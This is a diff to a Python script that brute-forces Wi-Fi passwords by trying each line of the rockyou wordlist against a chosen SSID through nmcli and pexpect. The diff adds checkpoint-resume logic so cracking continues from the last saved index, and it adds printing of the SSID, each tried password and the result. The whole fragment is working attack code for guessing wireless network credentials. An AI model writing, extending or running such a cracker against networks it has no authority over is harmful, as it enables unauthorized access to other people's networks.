@@ -18,6 +18,7 @@ t0 = time.time()
 with open("bruteforce.json", "r") as conf_file:
     conf = load(conf_file)
 print(conf)
+step = conf["i"]
 
 os.system("nmcli dev wifi list")
 ssid=input("ssid: ")
@@ -31,6 +32,8 @@ with open("/tmp/pexpect_test", "w") as stream:
         n = len(rockyou.read())
     with open(ROCKYOU_PATH, "rb") as rockyou:
         for i,line in enumerate(rockyou.readlines()):
+            if step>i:
+                continue
             if time.time() - t > TIMESTEP:
                 t = time.time()
                 print(f"{i}/{n}, {int(i/n*10000)/100}/100 {int(t-t0)}s")
@@ -39,7 +42,8 @@ with open("/tmp/pexpect_test", "w") as stream:
             child.expect(".*\$ ")
             child.readline()
             result=child.readline()
-            print(password)
+            print(ssid, password)
+            print(result)
             conf["i"] = i
             conf["password"] = password
             with open("bruteforce.json", "w") as conf_file:
